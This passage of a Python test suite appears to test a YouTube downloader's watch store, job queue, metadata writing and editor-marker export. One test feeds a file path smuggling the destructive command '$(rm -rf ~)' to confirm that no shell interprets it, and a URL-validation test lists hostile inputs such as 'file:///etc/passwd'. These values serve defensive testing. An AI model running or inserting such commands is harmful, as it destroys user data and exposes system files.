    """Pending stays newest-first (RSS order); titles refresh when the feed updates."""
    import tempfile, os
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w = ws.add('UC123', label='c', url='https://x', auto_queue=False)
    ws.update(w['id'], last_checked=1.0, seen=[])
    ws.apply_poll(w['id'], [
        {'id': 'a', 'title': 'A old', 'url': 'ua'},
        {'id': 'b', 'title': 'B old', 'url': 'ub'},
    ])
    # New upload 'c' appears at top of RSS; titles for a/b change.
    ws.apply_poll(w['id'], [
        {'id': 'c', 'title': 'C new', 'url': 'uc'},
        {'id': 'a', 'title': 'A refreshed', 'url': 'ua'},
        {'id': 'b', 'title': 'B refreshed', 'url': 'ub'},
    ])
    pend = ws.get(w['id'])['pending']
    assert [p['id'] for p in pend] == ['c', 'a', 'b'], [p['id'] for p in pend]
    assert pend[1]['title'] == 'A refreshed'
    print('test_watchstore_pending_newest_first_and_refresh_titles passed')


def test_watchstore_auto_enqueue_does_not_hold_mutex():
    """The auto_enqueue callback (which in the server nests fsync'd journal I/O) must run WITHOUT
    the WatchStore mutex held, so list()/get()/update() aren't stalled behind that I/O."""
    import tempfile, os, threading, time
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w = ws.add('UC123', label='c', url='https://x', auto_queue=True)
    ws.update(w['id'], last_checked=1.0)          # skip first-poll baseline
    in_cb = threading.Event()
    release_cb = threading.Event()
    reader_ms = []

    def enqueue(watch, v):
        in_cb.set()
        # Simulate slow journal I/O; another thread must be able to read the store meanwhile.
        release_cb.wait(3)
        return True

    def reader():
        in_cb.wait(3)                              # wait until we're inside the callback
        t0 = time.time()
        ws.list()                                  # must NOT block on the poll's callback I/O
        reader_ms.append(time.time() - t0)
        release_cb.set()                           # let the callback finish

    th = threading.Thread(target=reader)
    th.start()
    n, mode = ws.apply_poll(w['id'], [{'id': 'v1', 'title': 'A', 'url': 'u1'}], auto_enqueue_fn=enqueue)
    th.join(4)
    assert (n, mode) == (1, 'auto'), (n, mode)
    # If the mutex were held across the callback, list() would deadlock against release_cb and the
    # reader would never record a timing (or record a ~3s stall).
    assert reader_ms and reader_ms[0] < 1.5, reader_ms
    assert 'v1' in ws.get(w['id'])['seen']
    print('test_watchstore_auto_enqueue_does_not_hold_mutex passed')


def test_watchstore_auto_enqueue_failure_retries_then_gives_up():
    """A failing auto-enqueue is retried (video stays unseen) up to MAX_AUTO_QUEUE_RETRIES, then
    marked seen so it stops retrying; the last error stays visible."""
    import tempfile, os
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w = ws.add('UC123', label='c', url='https://x', auto_queue=True)
    ws.update(w['id'], last_checked=1.0)
    feed = [{'id': 'v1', 'title': 'A', 'url': 'u1'}]

    def boom(watch, v):
        raise RuntimeError('nope')

    for i in range(WatchStore.MAX_AUTO_QUEUE_RETRIES - 1):
        n, mode = ws.apply_poll(w['id'], feed, auto_enqueue_fn=boom)
        assert n == 0 and mode == 'auto', (i, n, mode)
        got = ws.get(w['id'])
        assert 'v1' not in got.get('seen', []), i           # still retryable
        assert got['auto_queue_fails']['v1'] == i + 1
        assert 'nope' in got['auto_queue_errors']['v1']
    # final attempt trips the cap -> give up: seen, counter cleared, error retained
    ws.apply_poll(w['id'], feed, auto_enqueue_fn=boom)
    got = ws.get(w['id'])
    assert 'v1' in got.get('seen', [])
    assert 'v1' not in (got.get('auto_queue_fails') or {})
    assert 'v1' in got['auto_queue_errors']
    print('test_watchstore_auto_enqueue_failure_retries_then_gives_up passed')


def test_watchstore_readd_merges_settings():
    """Re-adding an already-watched channel must MERGE the new settings into the existing record,
    not silently drop them (there is no separate 'edit watch' UI control)."""
    import tempfile, os
    from Final.watchstore import WatchStore
    ws = WatchStore(path=os.path.join(tempfile.mkdtemp(), 'w.json'))
    w1 = ws.add('UCzzz', label='orig', url='https://a', auto_queue=False,
                defaults={'quality': '1080p'}, filters={'filter_title': 'old'})
    wid = w1['id']
    w2 = ws.add('UCzzz', label='updated', url='https://b', auto_queue=True,
                defaults={'quality': '4k'}, filters={'filter_title': 'new'})
    assert w2['id'] == wid                                   # same watch, not a duplicate
    assert len(ws.list()) == 1
    got = ws.get(wid)
    assert got['label'] == 'updated'
    assert got['url'] == 'https://b'
    assert got['auto_queue'] is True
    assert got['defaults'] == {'quality': '4k'}
    assert got['filters'] == {'filter_title': 'new'}
    print('test_watchstore_readd_merges_settings passed')


def test_probe_duration_caches_by_video():
    """probe_duration memoizes successful results by video id: re-probing the same url must NOT
    spawn a second yt-dlp subprocess (the poller re-sees the same RSS window every cycle)."""
    import Final.watch as watch
    calls = []

    class _R:
        stdout = '123.0\n'

    def fake_run(cmd, **kw):
        calls.append(cmd)
        return _R()

    orig = watch.subprocess.run
    watch._DURATION_CACHE.clear()
    watch.subprocess.run = fake_run
    try:
        u = 'https://www.youtube.com/watch?v=abcdefghijk'
        assert watch.probe_duration(u) == 123
        assert watch.probe_duration(u) == 123               # served from cache
        assert len(calls) == 1, len(calls)                  # only ONE subprocess spawn
    finally:
        watch.subprocess.run = orig
        watch._DURATION_CACHE.clear()
    print('test_probe_duration_caches_by_video passed')


def test_write_ffmetadata_and_tags():
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    p = proc.write_ffmetadata('._w.ffmeta', tags={'title': 'a=b;c'},
                              chapters=[{'start_time': 0, 'end_time': 5, 'title': 'Intro'}])
    data = open(p, encoding='utf-8').read()
    import os
    os.remove(p)
    assert data.startswith(';FFMETADATA1') and '[CHAPTER]' in data and 'START=0' in data and 'END=5000' in data
    assert 'a\\=b\\;c' in data  # escaping
    assert proc.write_ffmetadata('._x', tags={}, chapters=[]) is None  # nothing to write
    # _build_tags from distilled info (date as date-tag, never timecode)
    from Final.yt_final import FinalYouTubeGPUEngine
    eng = FinalYouTubeGPUEngine(output_dir='.')
    tags = eng._build_tags({'title': 'T', 'uploader': 'U', 'upload_date': '20251231',
                            'webpage_url': 'http://x', 'description': 'a\n\nb'})
    assert tags['title'] == 'T' and tags['artist'] == 'U' and tags['date'] == '2025-12-31'
    assert tags['description'] == 'a b' and 'timecode' not in tags
    print('test_write_ffmetadata_and_tags passed')


def test_spec_download_opts():
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    from Final.jobspec import JobSpec
    # audio 'best' -> remux native bestaudio (no FFmpegExtractAudio)
    o = dl.get_optimized_ydl_opts('audio', audio_only=True, spec=JobSpec(urls=['u'], audio_format='best'))
    assert o['format'] == 'bestaudio/best'
    assert not any(pp.get('key') == 'FFmpegExtractAudio' for pp in o['postprocessors'])
    # audio flac -> extractor with flac
    o2 = dl.get_optimized_ydl_opts('audio', audio_only=True, spec=JobSpec(urls=['u'], audio_format='flac', audio_quality='0'))
    pp = [p for p in o2['postprocessors'] if p.get('key') == 'FFmpegExtractAudio'][0]
    assert pp['preferredcodec'] == 'flac'
    # archive ignored when section set; honored otherwise (test the layering helper directly to
    # avoid the real-yt_dlp section import path)
    o_sec = {}
    dl._apply_spec_download_opts(o_sec, [], JobSpec(urls=['u'], download_archive='a.txt'), section='0-5')
    assert 'download_archive' not in o_sec
    o_arc = {}
    dl._apply_spec_download_opts(o_arc, [], JobSpec(urls=['u'], download_archive='a.txt'), section=None)
    assert o_arc['download_archive'] == 'a.txt'
    # subtitles + sponsorblock wiring
    o3 = dl.get_optimized_ydl_opts('1080p', spec=JobSpec(urls=['u'], sub_langs=['en'], sponsorblock='mark'))
    assert o3['writesubtitles'] is True and o3['subtitleslangs'] == ['en']
    assert any(p.get('key') == 'SponsorBlock' for p in o3['postprocessors'])
    # default (no spec) is unchanged: no postprocessors for video
    assert dl.get_optimized_ydl_opts('1080p')['postprocessors'] == []
    print('test_spec_download_opts passed')


def test_download_journal():
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    jf = os.path.join(tempfile.mkdtemp(), 'q.json')
    j = DownloadJournal(jf)
    rec = j.add(JobSpec(urls=['https://youtu.be/x']))
    assert j.get(rec['id'])['status'] == 'queued'
    j.set_status(rec['id'], 'failed', error='boom', bump_attempt=True)
    assert j.get(rec['id'])['attempt_count'] == 1 and j.counts()['failed'] == 1
    assert j.retry_failed() == 1 and j.next_queued()['id'] == rec['id']
    # atomic rewrite survives reload
    assert DownloadJournal(jf).get(rec['id'])['status'] == 'queued'
    # run lock is exclusive
    assert j.acquire_run_lock() is True and DownloadJournal(jf).acquire_run_lock() is False
    j.release_run_lock()
    print('test_download_journal passed')


def test_manifest_loader():
    from Final.yt_final import _load_manifest
    import tempfile, os, json as _json
    p = os.path.join(tempfile.mkdtemp(), 'm.json')
    _json.dump({'defaults': {'quality': '720p'},
                'jobs': [{'urls': ['https://youtu.be/a']}, 'https://youtu.be/b']}, open(p, 'w'))
    specs = _load_manifest(p)
    assert len(specs) == 2 and specs[0].quality == '720p' and specs[1].urls == ['https://youtu.be/b']
    assert specs[1].quality == '720p'  # default applied to the bare-string job
    print('test_manifest_loader passed')


def test_mux_sidecars_container_family():
    """Regression (verifier HIGH): MOV is mp4-family (mov_text subs); webp cover must be re-encoded
    (mjpeg for mp4-family, png for mkv), never stream-copied."""
    det = CapabilityDetector()
    proc = FFmpegProcessor(det)
    cap = {}
    proc._run_ffmpeg = lambda cmd: cap.__setitem__('cmd', ' '.join(cmd)) or True
    proc.mux_sidecars('in.mp4', 'o.mov', sub_files=['s.en.srt'], thumb_file='t.webp', container='mov')
    assert '-c:s mov_text' in cap['cmd'] and '-c:v:1 mjpeg' in cap['cmd'] and '+faststart' in cap['cmd']
    assert '-c:v:1 copy' not in cap['cmd']  # never copy a webp cover
    proc.mux_sidecars('in.mkv', 'o.mkv', sub_files=['s.en.srt'], thumb_file='t.webp', container='mkv')
    assert '-c:s srt' in cap['cmd'] and '-c:v:1 png' in cap['cmd'] and '+faststart' not in cap['cmd']
    print('test_mux_sidecars_container_family passed')


def test_config_not_autoloaded_without_opt_in():
    """Regression (verifier MEDIUM): the bare fast-path must NOT auto-load ~/.yt_final/config.toml."""
    from Final.yt_final import _load_config_spec
    assert _load_config_spec(None, None) is None
    print('test_config_not_autoloaded_without_opt_in passed')


def test_on_complete_no_shell_injection():
    """Regression (verifier MEDIUM): the hook runs without a shell; a path with shell metacharacters
    is passed as a single argv token, never interpreted."""
    from Final.yt_final import FinalYouTubeGPUEngine
    import subprocess as _sp
    eng = FinalYouTubeGPUEngine(output_dir='.')
    cap = {}
    orig = _sp.run
    _sp.run = lambda argv, **kw: cap.__setitem__('argv', argv) or cap.__setitem__('shell', kw.get('shell'))
    try:
        eng._run_on_complete('echo {}', '/tmp/$(rm -rf ~).mp4')
    finally:
        _sp.run = orig
    assert cap['shell'] is False and isinstance(cap['argv'], list)
    assert cap['argv'] == ['echo', '/tmp/$(rm -rf ~).mp4']  # metachars stay inside one token
    print('test_on_complete_no_shell_injection passed')


def test_claim_next_atomic_and_attempt_cap():
    """Regression (verifier HIGH/LOW): claim_next is the atomic claim; attempts are capped so a
    permanently-failing job doesn't loop forever; retry-failed resets the cap."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    r = j.add(JobSpec(urls=['u']))
    for i in range(5):
        c = j.claim_next()
        assert c is not None and c['status'] == 'running'
        j.set_status(r['id'], 'queued')        # requeue WITHOUT resetting attempts
    assert j.claim_next() is None              # attempt cap reached -> skipped
    j.set_status(r['id'], 'failed')
    assert j.retry_failed() == 1               # resets attempt_count
    assert j.claim_next() is not None          # claimable again
    print('test_claim_next_atomic_and_attempt_cap passed')


def test_queue_priority_ordering():
    """claim_next picks highest priority, FIFO tie-break by created_at ascending."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    a = j.add(JobSpec(urls=['a']))
    b = j.add(JobSpec(urls=['b']))
    c = j.add(JobSpec(urls=['c']))
    j.set_priority(b['id'], 10)
    assert j.claim_next()['id'] == b['id']      # highest priority first
    assert j.claim_next()['id'] == a['id']      # FIFO tie-break: A older than C (both p0)
    assert j.claim_next()['id'] == c['id']
    # equal-priority -> older created_at wins
    j2 = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    x = j2.add(JobSpec(urls=['x']))
    y = j2.add(JobSpec(urls=['y']))
    j2.set_priority(x['id'], 5)
    j2.set_priority(y['id'], 5)
    assert j2.claim_next()['id'] == x['id']     # x created first
    print('test_queue_priority_ordering passed')


def test_queue_pause_blocks_claim():
    """Paused gate blocks NEW claims without touching status; a running job is never killed by pause."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    r = j.add(JobSpec(urls=['u']))
    j.set_paused(True)
    assert j.is_paused() is True
    assert j.claim_next() is None                       # paused -> no claim
    assert j.get(r['id'])['status'] == 'queued'         # untouched
    j.set_paused(False)
    assert j.claim_next()['id'] == r['id']              # resumes
    # pause never kills a running job
    j.set_paused(True)
    assert j.get(r['id'])['status'] == 'running'        # still running
    print('test_queue_pause_blocks_claim passed')


def test_queue_cancel_single_job():
    """cancel() sets STATUS_CANCELLED for queued/failed; requests cancel for running."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    r = j.add(JobSpec(urls=['u']))
    assert j.cancel(r['id'])['status'] == 'cancelled'
    assert j.counts()['cancelled'] == 1
    assert j.claim_next() is None                       # cancelled not claimable
    assert j.clear(only_finished=True) == 1             # terminal -> cleared
    # cancel on a running job sets cancel_requested (worker aborts cooperatively)
    r2 = j.add(JobSpec(urls=['v']))
    assert j.claim_next()['id'] == r2['id']
    c2 = j.cancel(r2['id'])
    assert c2 is not None
    assert c2['status'] == 'running'
    assert c2.get('cancel_requested') is True
    assert j.is_cancel_requested(r2['id']) is True
    # terminal cancel still works after worker marks cancelled
    j.set_status(r2['id'], 'cancelled')
    assert j.get(r2['id'])['status'] == 'cancelled'
    assert j.get(r2['id']).get('cancel_requested') is None
    assert j.cancel('nope') is None                     # missing id
    print('test_queue_cancel_single_job passed')


def test_result_meta_and_speed_stats():
    """Downloader exposes engine + avg/peak speed for durable job.result."""
    from Final.yt_final import YouTubeDownloader
    d = YouTubeDownloader.__new__(YouTubeDownloader)
    d._speed_samples = [1_048_576.0, 2_097_152.0, 3_145_728.0]  # 1, 2, 3 MiB/s
    d._last_fetch_path = 'builtin'
    d._last_fetch_reason = 'hybrid uses native yt-dlp for multi_dash'
    stats = YouTubeDownloader.speed_stats(d)
    assert abs(stats['avg_speed'] - 2_097_152.0) < 1
    assert stats['peak_speed'] == 3_145_728.0
    meta = YouTubeDownloader.result_meta(d)
    assert meta['engine'] == 'builtin'
    assert 'multi_dash' in meta['engine_reason']
    assert meta['peak_speed'] == 3_145_728.0
    print('test_result_meta_and_speed_stats passed')


def test_queue_remove_single_job():
    """remove() drops a job of any status from the journal."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os
    j = DownloadJournal(os.path.join(tempfile.mkdtemp(), 'q.json'))
    r = j.add(JobSpec(urls=['u']))
    assert j.remove(r['id'])['id'] == r['id']
    assert j.get(r['id']) is None
    assert j.counts()['queued'] == 0
    # running job can also be dismissed
    r2 = j.add(JobSpec(urls=['v']))
    assert j.claim_next()['id'] == r2['id']
    assert j.remove(r2['id'])['status'] == 'running'
    assert j.get(r2['id']) is None
    assert j.remove('nope') is None
    print('test_queue_remove_single_job passed')


def test_priority_default_and_legacy():
    """A new record defaults priority=0; a legacy record with no priority key still claims via .get."""
    from Final.jobstore import DownloadJournal
    from Final.jobspec import JobSpec
    import tempfile, os, json as _json
    jf = os.path.join(tempfile.mkdtemp(), 'q.json')
    j = DownloadJournal(jf)
    r = j.add(JobSpec(urls=['u']))
    assert r['priority'] == 0
    # simulate a legacy on-disk record without a 'priority' key
    data = _json.load(open(jf))
    data['jobs'][0].pop('priority', None)
    _json.dump(data, open(jf, 'w'))
    j2 = DownloadJournal(jf)
    claimed = j2.claim_next()                            # .get('priority',0) path must not KeyError
    assert claimed is not None and claimed['id'] == r['id']
    print('test_priority_default_and_legacy passed')


def test_output_dir_redirect():
    """Per-job output_dir redirects the downloader's path during the job, creates the folder, and
    restores the original path afterward (the engine's downloader is shared)."""
    from Final.yt_final import FinalYouTubeGPUEngine, JobSpec
    import tempfile, os
    eng = FinalYouTubeGPUEngine(output_dir='.')
    orig = eng.downloader.output_path
    seen = {}
    eng._run_body = lambda spec, urls, dl: seen.__setitem__('path', dl.output_path) or []
    dest = os.path.join(tempfile.mkdtemp(), 'sub')
    eng.run(JobSpec(urls=['u'], output_dir=dest))
    assert str(seen['path']).endswith('sub') and os.path.isdir(seen['path'])  # redirected + created
    assert eng.downloader.output_path == orig                                  # restored
    # no output_dir -> no redirect
    eng.run(JobSpec(urls=['u']))
    assert seen['path'] == orig
    print('test_output_dir_redirect passed')


def test_download_error_messages():
    """Failures map to actionable messages: locked browser cookies > bot-check > format."""
    from Final.yt_final import YouTubeDownloader as Y
    locked = Y._download_error_message(Exception('Could not copy Chrome cookie database'), 'edge', True)
    assert 'close edge' in locked.lower() and 'cookies.txt' in locked.lower()
    bot = Y._download_error_message(Exception("Sign in to confirm you're not a bot"), None, False)
    assert 'bot-check' in bot.lower() and ('cookies' in bot.lower() and 'wait' in bot.lower())
    fmt = Y._download_error_message(Exception('requested format not available'), None, False)
    assert 'format' in fmt.lower()
    # browser-cookie failure takes precedence over the underlying bot error
    pri = Y._download_error_message(Exception('not a bot'), 'chrome', True)
    assert 'chrome' in pri.lower() and 'cookie' in pri.lower()
    print('test_download_error_messages passed')


def test_validate_url_hardened():
    """Security: exact-host allowlist (substring matching let evil-youtube.com / file:// through)."""
    det = CapabilityDetector()
    dl = YouTubeDownloader(det, out_dir='.')
    for ok in ('https://www.youtube.com/watch?v=x', 'youtu.be/x',
               'https://music.youtube.com/watch?v=x', 'https://youtube.com/@chan',
               'https://youtube.com:443/watch?v=x', 'youtube.com:443/watch?v=x'):
        assert dl._validate_url(ok), ok
    for bad in ('https://evil-youtube.com/x', 'https://youtube.com.evil.com/x',
                'https://notyoutube.com/x', 'file:///etc/passwd', 'https://youtube.evil.com/x',
                'https://evil.test\\@youtube.com/watch?v=x',
                'https://user:secret@youtube.com/watch?v=x',
                'https://youtube.com:444/watch?v=x'):
        assert not dl._validate_url(bad), bad
    print('test_validate_url_hardened passed')


def test_markers_export():
    """Killer feature: chapters -> Resolve EDL / Premiere CSV / FCPXML."""
    from Final.markers import to_edl, to_csv, to_fcpxml, parse_formats, write_markers
    chs = [{'start_time': 0, 'end_time': 90, 'title': 'Intro'},
           {'start_time': 90, 'end_time': 210, 'title': 'A & B'}]
    edl = to_edl(chs, 25, 'T')
    assert 'FCM: NON-DROP FRAME' in edl and '* LOC: 00:00:00:00 RED Intro' in edl and '00:01:30:00 GREEN' in edl
    csvf = to_csv(chs, 30)
    assert 'Marker Name,Description,In,Out,Duration,Marker Type' in csvf and '00:01:30:00' in csvf
    fx = to_fcpxml(chs, 25, 240, 'T')
    assert 'chapter-marker' in fx and 'A &amp; B' in fx   # XML-escaped
    assert parse_formats('all') == ['edl', 'csv', 'fcpxml']
    assert parse_formats('edl, bogus, csv') == ['edl', 'csv']
    import tempfile, os
    m = os.path.join(tempfile.mkdtemp(), 'v.mp4')
    open(m, 'w').close()
    w = {os.path.basename(p) for p in write_markers(m, chs, 25, 'edl,csv')}
    assert w == {'v.edl', 'v.markers.csv'}, w
    assert write_markers(m, [], formats='edl') == []     # no chapters -> nothing
    print('test_markers_export passed')


def test_markers_dropframe_2997():
    """29.97 fps -> SMPTE drop-frame timecode (;) and FCM: DROP FRAME."""
    from Final.markers import to_edl, _timecode
    # Regression guard: integer rates must stay NON-DROP and byte-identical.
    assert _timecode(90, 25) == '00:01:30:00'
    assert _timecode(90, 30) == '00:01:30:00'
    # 29.97 @ 60.0s wall-clock: actual frame 1798 -> SMPTE DF label 00:00:59;28. Drop-frame tracks
    # wall-clock only across long spans and resyncs at the 10-min/hour marks (the whole point of DF).
    assert _timecode(60, 29.97) == '00:00:59;28', _timecode(60, 29.97)
    assert _timecode(600, 29.97) == '00:10:00;00', _timecode(600, 29.97)    # 10-min resync
    assert _timecode(3600, 29.97) == '01:00:00;00', _timecode(3600, 29.97)  # hour resync
    chs = [{'start_time': 60, 'end_time': 120, 'title': 'Drop'}]
    edl = to_edl(chs, 29.97, 'T')
    assert 'FCM: DROP FRAME' in edl, edl
    loc = [ln for ln in edl.splitlines() if ln.startswith('* LOC:')][0]
    assert '00:00:59;28' in loc, loc
    print('test_markers_dropframe_2997 passed')


def test_markers_ndf_23976():
    """23.976 fps -> NON-DROP (:) at the true 24000/1001 rate, no drift."""
    from Final.markers import to_edl, _timecode
    assert _timecode(0.0, 23.976) == '00:00:00:00'
    # 1.0s real * 24000/1001 -> 24 frames -> frame index 24 -> 00:00:01:00
    assert _timecode(1.0, 23.976) == '00:00:01:00', _timecode(1.0, 23.976)
    edl = to_edl([{'start_time': 0, 'end_time': 5, 'title': 'NDF'}], 23.976, 'T')
    assert 'FCM: NON-DROP FRAME' in edl
    assert '* LOC: 00:00:00:00' in edl
    assert ';' not in edl                      # no drop-frame separators anywhere
    print('test_markers_ndf_23976 passed')


def test_markers_csv_colors_and_notes():
    """CSV gains a 7th 'Marker Color' column + a Description note (source URL + chapter index),
    WITHOUT reordering/renaming the existing six Premiere-import columns (regression guard)."""
    from Final.markers import to_csv
    chs = [{'start_time': 0, 'end_time': 90, 'title': 'Intro'},
           {'start_time': 90, 'end_time': 210, 'title': 'Body'}]
    out = to_csv(chs, 30, source_url='https://youtu.be/x')
    header = out.splitlines()[0]
    # Columns 1-6 unchanged (substring), Marker Color appended at the end.
    assert 'Marker Name,Description,In,Out,Duration,Marker Type' in header, header
    assert header.rstrip().endswith(',Marker Color'), header
    # Description carries the source URL + 1-based chapter index.
    assert 'https://youtu.be/x #1' in out, out
    # Category cycle colors appear in the (now populated) color column.
    assert 'Red' in out and 'Green' in out, out
    # No URL -> index still present in the note.
    out2 = to_csv(chs, 30)
    assert '#1' in out2 and 'https://' not in out2, out2
    print('test_markers_csv_colors_and_notes passed')


def test_markers_written_byte_faithful_no_double_cr(tmp_path):
    """WINDOWS GUARD. The CSV generator emits RFC-4180 CRLF line endings, but Path.write_text()
    opens in TRANSLATING text mode — so on Windows every '\\n' becomes '\\r\\n', turning the
    generator's '\\r\\n' into '\\r\\r\\n' and producing malformed CSV that Premiere/Resolve reject.

    The invariant that prevents it: bytes on disk == the generator's output, byte for byte, so the
    platform never re-translates. That also keeps EDL/FCPXML (which emit bare LF) identical across
    macOS and Windows instead of diverging.

    NOTE: this cannot fail on macOS (no translation happens here) — it is a cross-platform
    invariant guard. The simulation at the end documents the hazard it protects against."""
    from Final import markers
    from Final.markers import write_markers
    chs = [{'start_time': 0, 'end_time': 90, 'title': 'Intro'},
           {'start_time': 90, 'end_time': 210, 'title': 'Body'}]
    media = tmp_path / 'clip.mp4'
    media.write_bytes(b'x')

    written = write_markers(media, chs, 30, 'csv,edl,fcpxml',
                            title='T', duration=210, source_url='https://youtu.be/x')
    assert written, 'no marker files written'

    norm = markers._norm(chs)
    for path in written:
        raw = Path(path).read_bytes()
        fmt = 'csv' if str(path).endswith('.markers.csv') else ('edl' if str(path).endswith('.edl') else 'fcpxml')
        expected = markers._FORMATS[fmt][1](norm, 30, 210, 'T', 'https://youtu.be/x').encode('utf-8')
        assert raw == expected, f'{fmt}: bytes on disk differ from generator output (newline translation?)'
        assert b'\r\r\n' not in raw, f'{fmt}: doubled CR — malformed for NLE importers'

    csv_path = next(p for p in written if str(p).endswith('.markers.csv'))
    csv_bytes = Path(csv_path).read_bytes()
    assert csv_bytes.count(b'\r\n') >= 3, 'CSV must KEEP its CRLF endings (not be flattened to LF)'

    # The hazard, made explicit: applying Windows text-mode translation to this content is exactly
    # what produced \r\r\n before the fix.
    assert b'\r\r\n' in csv_bytes.decode('utf-8').replace('\n', '\r\n').encode('utf-8')
    print('test_markers_written_byte_faithful_no_double_cr passed')


def test_ffmetadata_never_targets_media_sibling():
    """DATA-LOSS GUARD (regression). _finalize() wrote the ffmetadata scratch file to
    src.with_suffix('.ffmeta') and then unlink()ed it unconditionally — so a user's own
    'MyVideo.ffmeta' sitting beside 'MyVideo.mp4' was silently overwritten and then deleted.
    The scratch file must be a uniquely-owned temp, so cleanup can only ever remove what this
    invocation created.

    Structural (AST) rather than a text grep on purpose: the fix's own explanatory comment names
    the dangerous pattern, and a substring search cannot tell code from a comment about code."""
    import ast
    src = Path(__file__).parent.joinpath('yt_final.py').read_text(encoding='utf-8')
    offenders = [
        node.lineno for node in ast.walk(ast.parse(src))
        if isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
        and node.func.attr == 'with_suffix' and node.args
        and isinstance(node.args[0], ast.Constant)
        and str(node.args[0].value).endswith('.ffmeta')
    ]
    assert not offenders, (
        f"deterministic .ffmeta sibling reintroduced at line(s) {offenders} — "
        "it overwrites and then deletes a user's own file")
    assert 'ytf_meta_' in src, 'expected an owned mkstemp temp for the ffmetadata scratch file'
    print('test_ffmetadata_never_targets_media_sibling passed')


def test_distill_preserves_sponsorblock():
    """_distill_info must carry yt-dlp `sponsorblock_chapters` through (else SB markers no-op)."""
    info = {'sponsorblock_chapters': [{'category': 'sponsor', 'start_time': 5, 'end_time': 20}],
            'chapters': []}
    d = YouTubeDownloader._distill_info(info)
    sb = d.get('sponsorblock_chapters')
    assert sb and sb[0]['category'] == 'sponsor', sb
    assert sb[0]['start_time'] == 5 and sb[0]['end_time'] == 20, sb
    # Raw info without the key distills to [] (no crash).
    d2 = YouTubeDownloader._distill_info({'chapters': []})
    assert d2.get('sponsorblock_chapters') == [], d2
    print('test_distill_preserves_sponsorblock passed')


def test_sponsorblock_markers_export():
    """SponsorBlock categories -> color-coded markers in distinct .sponsorblock.* sidecars."""
    from Final.markers import sponsorblock_to_chapters, write_sponsorblock_markers
    sb = [{'category': 'sponsor', 'start_time': 0, 'end_time': 10},
          {'category': 'selfpromo', 'start_time': 10, 'end_time': 20},
          {'category': 'intro', 'start_time': 20, 'end_time': 25},
          {'category': 'outro', 'start_time': 25, 'end_time': 30}]
    chs = sponsorblock_to_chapters(sb)
    cmap = {c['title']: c['color'] for c in chs}
    assert cmap['[Sponsor]'] == 'Red', cmap
    assert cmap['[Selfpromo]'] == 'Yellow', cmap
    assert cmap['[Intro]'] == 'Cyan' and cmap['[Outro]'] == 'Cyan', cmap
    assert sponsorblock_to_chapters([]) == []
    import tempfile, os
    m = os.path.join(tempfile.mkdtemp(), 'v.mp4')
    open(m, 'w').close()
    written = write_sponsorblock_markers(m, sb, fps=25, formats='csv', source_url='https://youtu.be/x')
    names = {os.path.basename(p) for p in written}
    assert names == {'v.sponsorblock.csv'}, names      # distinct from v.markers.csv
    body = open(written[0], encoding='utf-8').read()
    assert '[Sponsor]' in body and 'Red' in body, body
    assert write_sponsorblock_markers(m, [], formats='csv') == []
    print('test_sponsorblock_markers_export passed')


def test_jobspec_sponsorblock_markers_field():
    """sponsorblock_markers round-trips through to_dict/from_dict and from_args picks it up."""
    from Final.jobspec import JobSpec
    from argparse import Namespace
    spec = JobSpec.from_dict({'urls': ['u'], 'sponsorblock_markers': 'edl,csv'})
    assert spec.sponsorblock_markers == 'edl,csv'
    assert JobSpec.from_dict(spec.to_dict()).sponsorblock_markers == 'edl,csv'
    a = Namespace(urls=['u'], sponsorblock_markers='all')
    assert JobSpec.from_args(a).sponsorblock_markers == 'all'
    print('test_jobspec_sponsorblock_markers_field passed')


def test_markers_fcpxml_rational():
    """FCPXML frameDuration carries the true rational rate (1001/24000s for 23.976)."""
    from Final.markers import to_fcpxml
    fx = to_fcpxml([{'start_time': 0, 'end_time': 5, 'title': 'X'}], 23.976, 240, 'T')
    assert '1001/24000s' in fx, fx
    fx25 = to_fcpxml([{'start_time': 0, 'end_time': 5, 'title': 'X'}], 25, 240, 'T')
    assert '1/25s' in fx25                     # integer-rate regression
    print('test_markers_fcpxml_rational passed')


def test_markers_5994_dropframe():
    """59.94 fps -> drop-frame, dropping 4 frames/min."""
    from Final.markers import to_edl, _timecode
    assert _timecode(60, 59.94) == '00:00:59;56', _timecode(60, 59.94)
    edl = to_edl([{'start_time': 0, 'end_time': 5, 'title': 'DF60'}], 59.94, 'T')
    assert 'FCM: DROP FRAME' in edl
    print('test_markers_5994_dropframe passed')


def test_jobspec_marker_and_shorts_fields():
    from Final.jobspec import JobSpec
    s = JobSpec.from_dict({'urls': ['u'], 'export_markers': 'edl,csv', 'no_shorts': 'true'})
    assert s.export_markers == 'edl,csv' and s.no_shorts is True
    assert JobSpec.from_dict(s.to_dict()).export_markers == 'edl,csv'
    print('test_jobspec_marker_and_shorts_fields passed')


def test_markers_vtt():
    """chapters -> WEBVTT chapter cue file (Jellyfin/Plex/browser)."""
    from Final.markers import to_vtt
    chs = [{'start_time': 0, 'end_time': 90, 'title': 'Intro'},
           {'start_time': 90, 'end_time': 210, 'title': 'A & B <tag>'}]
    v = to_vtt(chs)
    assert v.startswith('WEBVTT'), v[:20]
    assert '00:00:00.000 --> 00:01:30.000' in v, v
    assert '00:01:30.000 --> 00:03:30.000' in v, v
    assert '1\n' in v and '2\n' in v               # cue index lines present
    assert 'A & B <tag>' in v                       # plain text, NOT XML-escaped
    # empty chapters -> just the header, no cues
